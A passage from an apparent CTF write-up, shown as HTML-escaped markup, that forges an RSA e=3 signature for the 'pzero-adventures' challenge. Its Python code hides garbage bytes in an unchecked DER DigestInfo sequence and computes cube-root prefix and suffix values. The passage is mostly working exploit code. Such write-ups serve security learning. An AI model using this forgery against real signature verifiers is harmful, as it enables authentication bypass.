&lt;&#x2F;span&gt;&lt;span&gt;object_id &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerObjectId&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;object_id.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_digest_algorithm_identifier)
&lt;&#x2F;span&gt;&lt;span&gt;digest_algorithm_identifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;object_id.value
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;digest_algorithm_identifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;2.16.840.1.101.3.4.2.1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;invalid digest algorithm identifier&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;_null &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;sequence[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;null &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerNull&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;null.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_null)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;octet_string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerOctetString&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;octet_string.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(_digest)
&lt;&#x2F;span&gt;&lt;span&gt;digest &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;octet_string.payload
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Since the length of the &lt;code&gt;_digest_algorithm_identifier&lt;&#x2F;code&gt; sequence is never checked, we can hide something after the DerNull in the sequence. This is a bit tricky, since DerSequences (and DerOctetStrings) declare their length at the beginning of the DER representation. For example, in the representation of&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerOctetString&lt;&#x2F;span&gt;&lt;span&gt;(b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;hello!&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x04\x06&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;hello!&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&#x27;\x06&#x27; denotes the length of the string &#x27;hello!&#x27;. If the lengths are wrong, the parsing will fail, as it might e.g. read only 4 bytes of &#x27;hello!&#x27; and expect &#x27;o!&#x27; to be the header for the next part of the DER sequence, or it might think it&#x27;s done reading the whole DER sequence before all your data is consumed.&lt;&#x2F;p&gt;
&lt;p&gt;To start off, we need some functions from Filippo Valsorda&#x27;s writeup: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto.Util.asn1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;DerSequence, DerObjectId, DerOctetString, DerNull
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;gmpy2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;mpz, iroot, powmod, mul, t_mod
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;binascii
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# to_bytes(), from_bytes(), get_bit(), set_bit() and cube_root() taken from Filippo Valsorda&amp;#39;s post. 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&amp;quot;&amp;quot;&amp;quot; Return a bytes representation of a int &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;n.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;((n.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;byteorder&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;big&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&amp;quot;&amp;quot;&amp;quot; Makes a int from a bytestring &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(b, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;byteorder&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;big&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def get_bit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&amp;quot;&amp;quot;&amp;quot; Returns the b-th rightmost bit of n &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;n) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;b
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def set_bit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&amp;quot;&amp;quot;&amp;quot; Returns n with the b-th rightmost bit set to x &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return ~&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def cube_root&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;iroot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;mpz&lt;&#x2F;span&gt;&lt;span&gt;(n), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and we also use Filippo&#x27;s method for generating the suffix. &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# find a number that, once cube rooted, ends with the digest_info DER sequence.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def gen_suffix&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;target_suffix&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    sig_suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(target_suffix)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;get_bit&lt;&#x2F;span&gt;&lt;span&gt;(sig_suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, b) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;get_bit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(target_suffix), b):
&lt;&#x2F;span&gt;&lt;span&gt;	    sig_suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;set_bit&lt;&#x2F;span&gt;&lt;span&gt;(sig_suffix, b, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;sig_suffix
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As for obtaining the prefix, I simply cube root the prefix and check if it cubes back to the correct prefix. As long as that doesn&#x27;t work, I keep adding garbage (FF and 00 bytes) to the end, thus &amp;quot;pushing&amp;quot; the error away from my payload. After a while, I find something that cubes back to a number that begins with my intended prefix, and ends with a bunch of garbage.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;sig_prefix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;cube_root&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(target_prefix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;34 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# print(sig_prefix ** 3)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, how can we tie these two together?
We can have garbage between our prefix and suffix, hidden in the DER sequence. Since DER sequences start with declaring their length, the easiest way to get those correct is to use python to generate our payload&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;def sign&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;     digest_algorithm_identifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerSequence&lt;&#x2F;span&gt;&lt;span&gt;([
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerObjectId&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;2.16.840.1.101.3.4.2.1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(),
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerNull&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(),
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerOctetString&lt;&#x2F;span&gt;&lt;span&gt;(b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(i)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# This is our garbage, we can replace this with anything
&lt;&#x2F;span&gt;&lt;span&gt;     ])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     digest &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hashlib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;dumps&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;pzero-adventures&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;hur&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     digest_info &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerSequence&lt;&#x2F;span&gt;&lt;span&gt;(([
&lt;&#x2F;span&gt;&lt;span&gt;	digest_algorithm_identifier,
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;DerOctetString&lt;&#x2F;span&gt;&lt;span&gt;(digest).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(),
&lt;&#x2F;span&gt;&lt;span&gt;     ])).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;          
&lt;&#x2F;span&gt;&lt;span&gt;     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;digest_info
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now, we find the target prefix of our payload. I use sign() with varying inputs so that the generated payload + the padding bytes at the beginning sum to 256 bytes.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;sign&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;189&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;From target, we take the bytes up to header of our garbage DerOctetString, but not its payload. This way, we have the correct lengths defined in our payload, and we are free to fill it with garbage.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;target_prefix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x81\xf2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x81\xcd\x06\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;`&lt;&#x2F;span&gt;&lt;span 